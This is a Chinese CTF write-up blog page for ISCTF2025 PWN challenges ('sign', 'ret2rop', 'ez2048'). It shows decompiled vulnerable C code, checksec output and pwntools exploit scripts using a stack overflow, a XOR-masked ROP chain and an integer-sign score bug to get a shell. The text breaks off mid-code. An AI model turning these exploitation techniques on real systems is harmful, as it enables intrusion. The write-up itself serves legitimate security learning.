<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ISCTF2025 | LightCloveyou's Blog</title><meta name="author" content="LightCloveyou"><meta name="copyright" content="LightCloveyou"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ISCTF2025 PWN sign __int64 __fastcall main(int a1, char **a2, char **a3)&#123;  _DWORD buf[38]; &#x2F;&#x2F; [rsp+0h] [rbp-A8h] BYREF  unsigned __int64 v5; &#x2F;&#x2F; [rsp+98h] [rbp-10h]  v5 &#x3D; __readfsqword(0x28u);">
<meta property="og:type" content="article">
<meta property="og:title" content="ISCTF2025">
<meta property="og:url" content="https://lightcloveyou.github.io/2025/12/07/ISCTF2025/index.html">
<meta property="og:site_name" content="LightCloveyou&#39;s Blog">
<meta property="og:description" content="ISCTF2025 PWN sign __int64 __fastcall main(int a1, char **a2, char **a3)&#123;  _DWORD buf[38]; &#x2F;&#x2F; [rsp+0h] [rbp-A8h] BYREF  unsigned __int64 v5; &#x2F;&#x2F; [rsp+98h] [rbp-10h]  v5 &#x3D; __readfsqword(0x28u);">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lightcloveyou.github.io/img/33.jpg">
<meta property="article:published_time" content="2025-12-06T16:26:57.000Z">
<meta property="article:modified_time" content="2025-12-21T12:16:49.839Z">
<meta property="article:author" content="LightCloveyou">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://lightcloveyou.github.io/img/33.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "ISCTF2025",
  "url": "https://lightcloveyou.github.io/2025/12/07/ISCTF2025/",
  "image": "https://lightcloveyou.github.io/img/33.jpg",
  "datePublished": "2025-12-06T16:26:57.000Z",
  "dateModified": "2025-12-21T12:16:49.839Z",
  "author": [
    {
      "@type": "Person",
      "name": "LightCloveyou",
      "url": "https://LightCloveyou.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/avatar.jpg"><link rel="canonical" href="https://lightcloveyou.github.io/2025/12/07/ISCTF2025/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!true && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":1000,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ISCTF2025',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500&display=swap"><link rel="stylesheet" href="https://fontsapi.zeoseven.com/442/main/result.css"><meta name="generator" content="Hexo 8.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/33.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">LightCloveyou's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">ISCTF2025</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">ISCTF2025</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-12-06T16:26:57.000Z" title="发表于 2025-12-07 00:26:57">2025-12-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-12-21T12:16:49.839Z" title="更新于 2025-12-21 20:16:49">2025-12-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Competiton/">Competiton</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">7.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>41分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="isctf2025-pwn">ISCTF2025 PWN</h1>
<h3 id="sign">sign</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD buf[<span class="number">38</span>]; <span class="comment">// [rsp+0h] [rbp-A8h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+98h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">140</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;do you like blueshark?&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x3E8u</span>LL) &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data.arr[2] = 0x%x\n&quot;</span>, buf[<span class="number">27</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( buf[<span class="number">27</span>] == <span class="number">0xADDAAAAA</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;blueshark likes you too!&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;no love anymore...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单的溢出覆盖即可getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p=start()</span><br><span class="line">p.recvuntil(<span class="string">b&quot;do you like blueshark?\n&quot;</span>)</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x6c</span>+p64(<span class="number">0xADDAAAAA</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ret2rop">ret2rop</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> str[<span class="number">10</span>]; <span class="comment">// [rsp+6h] [rbp-Ah] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="keyword">sizeof</span>(str));</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;if you want to watch demo&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%10s&quot;</span>, str);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(str, <span class="string">&quot;yes&quot;</span>) )</span><br><span class="line">    demo();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;now solve this pratice&quot;</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>进入vuln</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  $F60773D3744C13F48A6AC74423E18A6D frame; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">ssize_t</span> n; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">ssize_t</span> i; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please int your name&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">0x10u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please introduce yourself&quot;</span>);</span><br><span class="line">  getRandom(frame.mask, <span class="number">32LL</span>);</span><br><span class="line">  n = read(<span class="number">0</span>, &amp;frame, <span class="number">0x100u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( n &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; n; ++i )</span><br><span class="line">      frame.buf[i] ^= frame.mask[i];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> ~/ISCTF/ret2rop  checksec ./pwn                                                                                                   </span><br><span class="line">[*] <span class="string">&#x27;/home/ubuntu/ISCTF/ret2rop/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>
<p>给了很多gadget，有后门system、pop rsi、mov rdi, rsi等等</p>
<p>name在bss段上</p>
<p>有个坑点就是虽然给了/bin/sh但是不能用，后面有一个<code>”</code>，只能使用bss段上写入/bin/sh00来利用了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rodata:00000000004020D0 ; const char s[]</span><br><span class="line">.rodata:00000000004020D0 s               db 1Bh,&#x27;[32m&gt;&gt;&gt; Success: Entered target function (simulated system(&quot;/&#x27;</span><br><span class="line">.rodata:00000000004020D0                                         ; DATA XREF: gadget_call_target+20↑o</span><br><span class="line">.rodata:000000000040210E                 db &#x27;bin/sh&quot;))&#x27;,1Bh,&#x27;[0m&#x27;,0</span><br><span class="line">.rodata:000000000040211C                 align 20h</span><br></pre></td></tr></table></figure>
<p>这个异或也是挺有意思的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 struct $F60773D3744C13F48A6AC74423E18A6D // sizeof=0x40</span><br><span class="line">00000000 &#123;                                       // XREF: vuln/r</span><br><span class="line">00000000     char buf[32];</span><br><span class="line">00000020     char mask[32];                      // XREF: vuln+82/o</span><br><span class="line">00000040 &#125;;</span><br></pre></td></tr></table></figure>
<p>也就是说后面的与前面的异或后填到前面，只需用0异或就可以保证不变</p>
<p>可以用pop rsi + addr(/bin/sh) + mov rdi, rsi + call system，但是实际上发现system没有16位对齐，要加一个retn</p>
<p>这样就是5个p64了，但是异或是隔4个p64</p>
<p><code>p64(0) + p64(0) + p64(0) + p64(0) + retn + pop rsi + addr(/bin/sh\x00) + mov rdi, rsi + call system</code></p>
<p>会变成</p>
<p><code>retn + pop rsi + addr(/bin/sh\x00) + mov rdi, rsi + call system^retn</code></p>
<p>异或是可逆的，只用将call system 改为 call system^retn 就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p=start()</span><br><span class="line">orig_binsh_addr=<span class="number">0x40210d</span></span><br><span class="line">input_binsh_addr=<span class="number">0x4040f0</span></span><br><span class="line">system_addr=<span class="number">0x401A39</span></span><br><span class="line">mov_rdi_addr=<span class="number">0x401A25</span></span><br><span class="line">pop_rsi_addr=<span class="number">0x401A1C</span></span><br><span class="line">retn_addr=<span class="number">0x401C15</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;if you want to watch demo\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;no&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;please int your name\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;please introduce yourself\n&quot;</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)*(<span class="number">11</span>+<span class="number">4</span>)+p64(retn_addr)+p64(pop_rsi_addr)+p64(input_binsh_addr)+p64(mov_rdi_addr)+p64(<span class="number">0x62c</span>)+p64(<span class="number">0</span>)*<span class="number">8</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ez2048">ez2048</h3>
<p>保护详情</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> ~/ISCTF/ez2048  checksec ./pwn                                                                                                   </span><br><span class="line">[*] <span class="string">&#x27;/home/ubuntu/ISCTF/ez2048/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> n81; <span class="comment">// [rsp+Fh] [rbp-51h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">72</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  score = <span class="number">50</span>;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome to ISCTF2025\ninput your name\n&gt;&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x32u</span>LL);</span><br><span class="line">  buf[<span class="built_in">strcspn</span>(buf, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, <span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span class="built_in">strcat</span>(dest, buf);</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, dest);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s,I won&#x27;t give you the shell until you get 100,000 points,Press \&quot;Enter\&quot; to start the game&quot;</span>, buf);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    playgame();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter \&quot;Q\&quot; to settle and exit. Enter any other characters to start a new round\n&gt;&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    n81 = getchar();</span><br><span class="line">    <span class="keyword">if</span> ( n81 == <span class="number">81</span> || n81 == <span class="number">113</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    getchar();</span><br><span class="line">  &#125;</span><br><span class="line">  final();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>playgame没有什么漏洞</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">playgame</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [rsp+Eh] [rbp-52h]</span></span><br><span class="line">  _BYTE v3[<span class="number">64</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  seed = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(seed);</span><br><span class="line">  init_game(v3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    draw_game(v3);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="type">unsigned</span> __int8)get_user_input() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">        v2 = move_left(v3);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">        v2 = move_right(v3);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\ngame over!&quot;</span>);</span><br><span class="line">        score -= <span class="number">10</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;your score:%d\n&quot;</span>, score);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">        v2 = move_down(v3);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">        v2 = move_up(v3);</span><br><span class="line">LABEL_10:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          spawn_new_number(v3);</span><br><span class="line">          v4 = check_game_over(v3);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主要的漏洞出在final</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">final</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;checking your score...&quot;</span>);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your score:%u\ntarget score:100000\n&quot;</span>, score);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)score &lt;= <span class="number">0x1869F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your score doesn&#x27;t meet the target,so you are not suitable for the flag yet...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;here is your shell&quot;</span>);</span><br><span class="line">    sleep(<span class="number">1u</span>);</span><br><span class="line">    shell();</span><br><span class="line">  &#125;</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将一个int的类型转换为unsigned int，这样就可以利用playgame的q反复扣除分数到负数，这样比较时就把score当作了一个很大的正数，经典的漏洞了</p>
<p>再来看shell</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-94h]</span></span><br><span class="line">  _QWORD buf[<span class="number">18</span>]; <span class="comment">// [rsp+10h] [rbp-90h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">17</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">128</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;$ &quot;</span>);</span><br><span class="line">      v1 = read(<span class="number">0</span>, buf, <span class="number">0x128u</span>LL);</span><br><span class="line">      <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      perror(<span class="string">&quot;read error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> &amp;&amp; *((_BYTE *)buf + v1 - <span class="number">1</span>) == <span class="number">10</span> )</span><br><span class="line">      *((_BYTE *)buf + v1 - <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;executing command: &quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>((<span class="type">const</span> <span class="type">char</span> *)buf);</span><br><span class="line">    sleep(<span class="number">1u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>((<span class="type">const</span> <span class="type">char</span> *)buf, <span class="string">&quot;exit&quot;</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>((<span class="type">const</span> <span class="type">char</span> *)buf, <span class="string">&quot;ls&quot;</span>) )</span><br><span class="line">      system((<span class="type">const</span> <span class="type">char</span> *)buf);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;command not found: %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span 